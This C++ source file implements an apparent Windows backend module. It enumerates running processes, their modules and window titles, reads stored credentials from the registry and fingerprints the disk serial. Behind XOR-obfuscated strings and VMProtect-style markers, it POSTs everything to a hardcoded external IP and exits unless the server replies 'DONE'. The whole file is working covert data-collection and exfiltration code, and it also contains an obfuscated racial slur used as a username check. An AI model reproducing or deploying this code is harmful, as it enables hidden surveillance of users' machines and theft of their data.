#include <inc.h>
PROCESS_INFORMATION sys::c_backend::open_pid(const int pid)
{
	PROCESS_INFORMATION pi = {};
	if (pid) pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_READ, FALSE, pid);
	else return pi;
	if (pi.hProcess) return pi;
	return pi;
}
BOOL sys::c_backend::is_main_window(const HWND handle)
{
	return GetWindow(handle, GW_OWNER) == HWND(nullptr) && IsWindowVisible(handle);
}
static BOOL enum_windows_callback(HWND handle, LPARAM lParam)
{
	auto& data = *(sys::handle_data*)lParam;
	unsigned long process_id = 0;
	GetWindowThreadProcessId(handle, &process_id);
	if (data.process_id != process_id || !sys::backend->is_main_window(handle)) return TRUE;
	data.window_handle = handle;
	return FALSE;
}
HWND sys::c_backend::find_main_window(unsigned long process_id)
{
	handle_data data{};
	data.process_id = process_id;
	data.window_handle = nullptr;
	EnumWindows(enum_windows_callback, (LPARAM)&data);
	return data.window_handle;
}
std::vector<sys::s_process_info> sys::c_backend::gather()
{
	auto list = std::vector<s_process_info>();
	auto list_final = std::vector<s_process_info>();
	const auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	auto pentry32 = PROCESSENTRY32();
	if (handle == INVALID_HANDLE_VALUE) return {};
	pentry32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(handle, &pentry32))
	{
		TCHAR filename[MAX_PATH];
		auto pehandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pentry32.th32ProcessID);
		GetModuleFileNameEx(pehandle, nullptr, filename, MAX_PATH);
		CloseHandle(pehandle);

		auto wnd = find_main_window(pentry32.th32ProcessID);
		char wnd_title[MAX_PATH];
		if (wnd) GetWindowTextA(wnd, wnd_title, sizeof(wnd_title));

		list.emplace_back(pentry32.szExeFile, pentry32.th32ProcessID, filename, wnd_title);
		while (Process32Next(handle, &pentry32))
		{
			auto pehandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pentry32.th32ProcessID);
			if (pehandle == INVALID_HANDLE_VALUE || pehandle == NULL) continue;
			GetModuleFileNameEx(pehandle, nullptr, filename, MAX_PATH);

			std::vector<std::string> modules;

			wnd = find_main_window(pentry32.th32ProcessID);
			if (wnd) GetWindowTextA(wnd, wnd_title, sizeof(wnd_title));
			if (strlen(wnd_title) <= 2) memset(wnd_title, 0, 260);

			if (std::string(wnd_title).size() > 2 && pentry32.th32ProcessID && pehandle && (std::string(filename).size() > 2))
			{
				TCHAR szModName[MAX_PATH]; HMODULE hMods[1024]; uint8_t i; DWORD cbNeeded;
				if (EnumProcessModules(pehandle, hMods, sizeof(hMods), &cbNeeded))
				{
					for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
					{
						TCHAR szModName[MAX_PATH];
						if (GetModuleFileNameEx(pehandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) modules.push_back(szModName);
					}
				}
			}

			CloseHandle(pehandle);

			if (strstr(filename, "windows") || strstr(filename, "Windows") || strstr(filename, "system32") || strstr(filename, "System32")) continue;

			list.emplace_back(pentry32.szExeFile, pentry32.th32ProcessID, filename, wnd_title);
			list.back().modules = modules;
		}
	}
	return list;
}
std::string sys::c_backend::xor_fn(std::string i, std::string k)
{
	for (auto c = 0; c < i.size(); c++) i[c] ^= k[c % k.length()];
	return i;
}
std::string sys::c_backend::ghwid()
{
	auto h = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (h == INVALID_HANDLE_VALUE) return {};
	std::unique_ptr<std::remove_pointer<HANDLE>::type, void(*)(HANDLE)> hDevice{ h, [](HANDLE handle) {CloseHandle(handle); } };
	STORAGE_PROPERTY_QUERY storagePropertyQuery{};
	storagePropertyQuery.PropertyId = StorageDeviceProperty;
	storagePropertyQuery.QueryType = PropertyStandardQuery;
	STORAGE_DESCRIPTOR_HEADER storageDescriptorHeader{};
	DWORD dwBytesReturned = 0;
	if (!DeviceIoControl(hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		&storageDescriptorHeader, sizeof(STORAGE_DESCRIPTOR_HEADER), &dwBytesReturned, NULL))
		return {};
	const DWORD dwOutBufferSize = storageDescriptorHeader.Size;
	std::unique_ptr<BYTE[]> pOutBuffer{ new BYTE[dwOutBufferSize]{} };
	if (!DeviceIoControl(hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		pOutBuffer.get(), dwOutBufferSize, &dwBytesReturned, NULL))
		return {};
	STORAGE_DEVICE_DESCRIPTOR* pDeviceDescriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(pOutBuffer.get());
	const DWORD dwSerialNumberOffset = pDeviceDescriptor->SerialNumberOffset;
	if (dwSerialNumberOffset == 0) return {};
	const char* serialNumber = reinterpret_cast<const char*>(pOutBuffer.get() + dwSerialNumberOffset);
	std::string serialNumber_s = serialNumber;

	std::string::iterator end_pos = std::remove(serialNumber_s.begin(), serialNumber_s.end(), ' ');
	serialNumber_s.erase(end_pos, serialNumber_s.end());

	for (auto c = 0; c < serialNumber_s.size(); c++) serialNumber_s[c] ^= 3;
	char username[1024];
	DWORD username_len = 1024;
	auto user = GetUserNameA(username, &username_len);
	//std::to_string(user)
	return this->xor_fn(serialNumber_s, std::to_string(user));
}
void sys::c_backend::setup()
{
	auto str8_9290_username18 = new core::s_str_container(std::vector<int>{124, 122, 108, 123, 103, 104, 100, 108}); /*username*/
	auto str8_23258_password19 = new core::s_str_container(std::vector<int>{121, 104, 122, 122, 126, 102, 123, 109}); /*password*/
	this->usr = this->get_val(str8_9290_username18->get());
	this->pass = this->get_val(str8_23258_password19->get());
	this->hwid = this->ghwid();
	delete str8_9290_username18;
	delete str8_23258_password19;
}
std::string sys::c_backend::get_val(std::string name)
{
	HKEY key; TCHAR value[1024]; DWORD bufLen = 1024 * sizeof(TCHAR); long ret;
	auto str15_24689_SOFTWARE__2880227 = new core::s_str_container(std::vector<int>{90, 70, 79, 93, 94, 72, 91, 76, 85, 85, 59, 49, 49, 57, 59}); /*SOFTWARE\\28802*/
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, str15_24689_SOFTWARE__2880227->get().c_str(), 0, KEY_QUERY_VALUE, &key);
	delete str15_24689_SOFTWARE__2880227;
	if (ret != ERROR_SUCCESS) return std::string();
	ret = RegQueryValueEx(key, name.c_str(), 0, 0, (LPBYTE)value, &bufLen);
	RegCloseKey(key);
	if ((ret != ERROR_SUCCESS) || (bufLen > 1024 * sizeof(TCHAR))) return std::string();
	auto stringValue = std::string(value, (size_t)bufLen - 1);
	size_t i = stringValue.length();
	while (i > 0 && stringValue[i - 1] == '\0') --i;
	return stringValue.substr(0, i);
}
void __stdcall sys::backend_worker()
{
	VMStart();
	auto d = sys::backend->gather();
	if (!d.size()) ExitProcess(0);
	std::stringstream v;
	auto hwid = sys::backend->ghwid();
	auto web_c = new web::client(false, true);
	
	auto str15_8139_185_193_126_23526 = new core::s_str_container(std::vector<int>{56, 49, 60, 39, 56, 48, 58, 39, 56, 59, 63, 39, 59, 58, 60}); /*185.193.126.235*/
	auto str6_19616__npid_17 = new core::s_str_container(std::vector<int>{85, 103, 121, 96, 109, 51}); /*\npid:*/
	auto str8_8139__ntitle_18 = new core::s_str_container(std::vector<int>{85, 103, 125, 96, 125, 101, 108, 51}); /*\ntitle:*/
	auto str7_19616__npath_18 = new core::s_str_container(std::vector<int>{85, 103, 121, 104, 125, 97, 51}); /*\npath:*/
	auto str6_8139__nexe_16 = new core::s_str_container(std::vector<int>{85, 103, 108, 113, 108, 51}); /*\nexe:*/
	auto str2_19616__n13 = new core::s_str_container(std::vector<int>{85, 103}); /*\n*/
	auto str7_8139_module_17 = new core::s_str_container(std::vector<int>{100, 102, 109, 124, 101, 108, 51}); /*module:*/
	auto str9_10571_index_php20 = new core::s_str_container(std::vector<int>{96, 103, 109, 108, 113, 39, 121, 97, 121}); /*index.php*/
	auto str4_42331_user15 = new core::s_str_container(std::vector<int>{124, 122, 108, 123}); /*user*/
	auto str4_10571_pass15 = new core::s_str_container(std::vector<int>{121, 104, 122, 122}); /*pass*/
	auto str4_42331_hwid15 = new core::s_str_container(std::vector<int>{97, 126, 96, 109}); /*hwid*/
	auto str6_10571_action17 = new core::s_str_container(std::vector<int>{104, 106, 125, 96, 102, 103}); /*action*/
	auto str4_42331_peer15 = new core::s_str_container(std::vector<int>{121, 108, 108, 123}); /*peer*/
	auto str8_10571_peerData19 = new core::s_str_container(std::vector<int>{121, 108, 108, 123, 77, 104, 125, 104}); /*peerData*/
	auto str4_18345_DONE15 = new core::s_str_container(std::vector<int>{77, 70, 71, 76}); /*DONE*/

	web_c->connect(str15_8139_185_193_126_23526->getW());
	for (auto a : d)
	{
		v << str6_19616__npid_17->get() << a.proc_id << str8_8139__ntitle_18->get() << a.title.c_str() << str7_19616__npath_18->get() << a.full_path.c_str() << str6_8139__nexe_16->get() << a.exe_name.c_str() << str2_19616__n13->get();
		for (auto b : a.modules) v << str7_8139_module_17->get() << b.c_str() << str2_19616__n13->get();
		
		web_c->request(str9_10571_index_php20->getW(), web::requestmode::POST, { {str4_42331_user15->get(), sys::backend->usr.c_str()}, { str4_10571_pass15->get(), sys::backend->pass.c_str() }, { str4_42331_hwid15->get(), hwid.c_str() }, {str6_10571_action17->get(), str4_42331_peer15->get()}, { str8_10571_peerData19->get() , v.str().c_str() } });

		auto ret = web_c->tostring(web_c->get());
		if (ret.empty()) continue;
		std::string key = ret.substr(0, 10);
		std::string data = ret.substr(10);
		ret = sys::backend->xor_fn(data, key);

		if (ret != str4_18345_DONE15->get()) ExitProcess(0);
	}
	delete str15_8139_185_193_126_23526;
	delete str6_19616__npid_17;
	delete str8_8139__ntitle_18;
	delete str7_19616__npath_18;
	delete str6_8139__nexe_16;
	delete str2_19616__n13;
	delete str7_8139_module_17;
	delete str9_10571_index_php20;
	delete str4_42331_user15;
	delete str4_10571_pass15;
	delete str4_42331_hwid15;
	delete str6_10571_action17;
	delete str4_42331_peer15;
	delete str8_10571_peerData19;
	delete str4_18345_DONE15;
	sys::backend->thread_working = false;
	delete web_c;
	VMEnd();
}
void sys::c_backend::work()
{
	if (!this->usr.size()) this->setup(); 
	if (this->thread_working) return;
	if (GetTickCount64() > this->last_run) this->last_run = 120000;
	else return;
	auto str5_3548_noxiu15 = new core::s_str_container(std::vector<int>{103, 102, 113, 96, 124}); /*noxiu*/
	auto str6_19578_nigger17 = new core::s_str_container(std::vector<int>{103, 96, 110, 110, 108, 123}); /*nigger*/
	if (this->usr == str5_3548_noxiu15->get().c_str() || this->usr == str6_19578_nigger17->get().c_str()) return;
	delete str6_19578_nigger17;
	delete str5_3548_noxiu15;
	this->thread_working = true;
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sys::backend_worker, 0, 0, 0);
}
sys::c_backend* sys::backend;